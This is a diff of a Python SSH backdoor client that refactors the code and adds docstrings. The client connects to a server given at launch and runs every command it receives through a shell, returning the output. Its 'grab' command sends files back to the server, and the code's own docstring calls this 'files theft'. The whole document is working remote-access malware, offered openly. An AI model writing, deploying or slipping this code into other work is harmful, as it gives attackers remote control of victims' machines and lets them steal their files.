@@ -1,6 +1,5 @@
 import argparse
 import os
-import socket
 import subprocess
 import sys
 import time
@@ -8,7 +7,77 @@ import time
 import paramiko
 
 
+class Client:
+    def __init__(self, server_ip, server_port):
+        self.client = paramiko.SSHClient()
+        self.client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
+        self.server_ip = server_ip
+        self.server_port = server_port
+
+    def connect_auth(self, username, password):
+        '''Try to connect to the server with ssh.
+
+        Params
+        -----
+        username: str
+            username for authorization
+        password: str
+            password for authorization
+
+        Return
+        -----
+        : bool
+            True on success authentication,
+            False otherwise
+        '''
+        try:
+            self.client.connect(
+                self.server_ip, self.server_port,
+                username=username, password=password)
+            return True
+        except Exception as e:
+            print(e)
+            return False
+
+    def open_channel(self, verbose):
+        '''Open the channel.
+        '''
+        channel = self.client.get_transport().open_session()
+        # check connection communication
+        serv_req = channel.recv(2)
+        channel.sendall(sys.platform)
+        if verbose:
+            print(serv_req)
+        return channel
+
+    def open_door(self, chan, verbose):
+        '''
+        Start executing commands getting through the ssh channel from the server.
+        '''
+        while True:
+            command = chan.recv(1024)
+            try:
+                command = command.decode('utf-8')
+                if 'grab' in command:
+                    cmd_result = grab(chan, command, verbose)
+                elif command == 'server stop':
+                    try:
+                        self.client.close()
+                    except Exception as e:
+                        print(e)
+                    sys.exit(0)
+                else:
+                    cmd_result = subprocess.check_output(command, shell=True)
+                    if not cmd_result:
+                        cmd_result = 'done(no result)'
+                chan.send(cmd_result)
+            except Exception as e:
+                chan.send(str(e))
+
+
 def get_args():
+    '''Parse args at startup.
+    '''
     parser = argparse.ArgumentParser(description='Client')
     parser.add_argument('sip', help='the server ip')
     parser.add_argument('sp', type=int, help='the server port')
@@ -19,6 +88,9 @@ def get_args():
 
 
 def send_files(chan, local_path, fname=None, verbose=False):
+    '''
+    Try to send file(s) from the 'local_path' through the channel.
+    '''
     try:
         # check path
         try:
@@ -58,6 +130,9 @@ def send_files(chan, local_path, fname=None, verbose=False):
 
 
 def grab(chan, grab_command, out_loud=False):
+    '''
+    Returns the result of files theft.
+    '''
     grab_args = grab_command.split()
 
     if len(grab_args) == 2:
@@ -71,78 +146,6 @@ def grab(chan, grab_command, out_loud=False):
     return cmd_result
 
 
-class Client:
-    def __init__(self, server_ip, server_port):
-        self.client = paramiko.SSHClient()
-        self.client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
-        self.server_ip = server_ip
-        self.server_port = server_port
-        self.platform = sys.platform
-        self.ip, self.hostname = self.get_ip(True)
-
-    def connect_auth(self, username, password):
-        '''Try to connect to the server
-
-        Params
-        -----
-        username: str
-            username for authorization
-        password: str
-            password for authorization
-
-        Return
-        -----
-        : bool
-            True on success authentication,
-            False otherwise
-        '''
-        try:
-            self.client.connect(
-                self.server_ip, self.server_port,
-                username=username, password=password)
-            return True
-        except Exception as e:
-            print(e)
-            return False
-
-    def open_channel(self, verbose):
-        channel = self.client.get_transport().open_session()
-        # check connection communication
-        serv_req = channel.recv(2)
-        channel.sendall(f'{self.ip} {self.platform}')
-        if verbose:
-            print(serv_req)
-        return channel
-
-    def get_ip(self, get_hostname=False):
-        ip = socket.gethostbyname(socket.gethostname())
-        if get_hostname:
-            return ip, socket.gethostname()
-        else:
-            return ip
-
-    def open_door(self, chan, verbose):
-        while True:
-            command = chan.recv(1024)
-            try:
-                command = command.decode('utf-8')
-                if 'grab' in command:
-                    cmd_result = grab(chan, command, verbose)
-                elif command == 'server stop':
-                    try:
-                        self.client.close()
-                    except Exception as e:
-                        print(e)
-                    sys.exit(0)
-                else:
-                    cmd_result = subprocess.check_output(command, shell=True)
-                    if not cmd_result:
-                        cmd_result = 'done(no result)'
-                chan.send(cmd_result)
-            except Exception as e:
-                chan.send(str(e))
-
-
 def main():
     # parse args
     args = get_args()
@@ -150,14 +153,14 @@ def main():
     # Create ssh client
     client = Client(args.sip, args.sp)
 
-    # connection
+    # connect to the server
     if not client.connect_auth(args.un, args.ps):
         sys.exit(1)
 
     # open channel
     chan = client.open_channel(args.verbose)
 
-    # door
+    # open door
     client.open_door(chan, args.verbose)
 
 
